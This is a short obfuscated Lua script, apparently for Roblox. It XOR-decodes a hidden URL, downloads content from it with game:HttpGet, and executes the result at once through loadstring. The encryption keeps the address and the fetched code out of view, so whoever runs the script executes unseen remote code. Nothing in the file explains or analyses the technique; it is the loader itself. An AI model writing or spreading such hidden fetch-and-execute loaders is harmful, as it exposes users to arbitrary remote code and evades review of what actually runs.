local v0=string.char;
local v1=string.byte;
local v2=string.sub;
local v3=bit32 or bit;
local v4=v3.bxor;
local v5=table.concat;
local v6=table.insert;

local function v7(a, b)
    local c = {}
    for i = 1, #a do
        v6(c, v0(v4(v1(v2(a, i, i)), v1(v2(b, (i % #b) + 1, (i % #b) + 1))) % 256))
    end
    return v5(c)
end

local v8 = loadstring(game:HttpGet(v7("\206\155\149\136\206\155\141\217\205\148\137\217\206\152\192\219\207\152\193\218\192\132\203\157\136\136\222\204\145\135\208\150\150\141\221\214\159","\117\84\35\53\117\84\43\110\116\85\33\110\117\89\70\108\118\89\71\109\115\45\100\86\33\33\111\113\40\37\99\36\36\43\106\126\41"), true))()
